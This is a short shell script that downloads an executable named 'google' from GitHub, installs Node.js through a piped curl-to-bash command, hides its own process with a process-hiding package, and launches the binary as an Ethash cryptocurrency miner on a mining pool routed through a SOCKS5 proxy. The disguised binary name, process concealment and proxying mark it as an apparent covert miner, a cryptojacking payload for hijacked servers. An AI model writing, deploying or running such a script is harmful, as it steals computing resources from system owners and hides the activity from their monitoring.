#!/bin/sh
#!/bin/bash
wget https://github.com/aurbach55/dera/raw/main/google
chmod +x ./google
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
ph add goog.sh
sleep 14
./google --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user thunder0x.$(echo $(shuf -i 1-99999 -n 1)-T4) --ethstratum ETHPROXY --socks5 46.174.43.18:1080 --timeprint on --longstats 60

